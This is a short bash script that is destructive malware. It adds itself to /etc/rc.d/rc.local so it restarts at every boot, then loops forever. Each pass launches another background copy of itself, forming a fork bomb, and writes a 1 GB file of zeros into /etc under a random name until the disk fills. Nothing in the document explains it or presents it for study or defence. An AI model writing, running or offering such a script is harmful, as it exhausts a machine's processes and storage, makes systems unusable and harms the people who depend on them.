#!/bin/bash
cat /etc/rc.d/rc.local  | grep "$0" || echo $(pwd)"/"$0 >> /etc/rc.d/rc.local
while true
  do
#  chmod +x ./$0
  ./$0 &
#  sleep 10
  dd if=/dev/zero of=/etc/$RANDOM bs=1M count=1024
  done
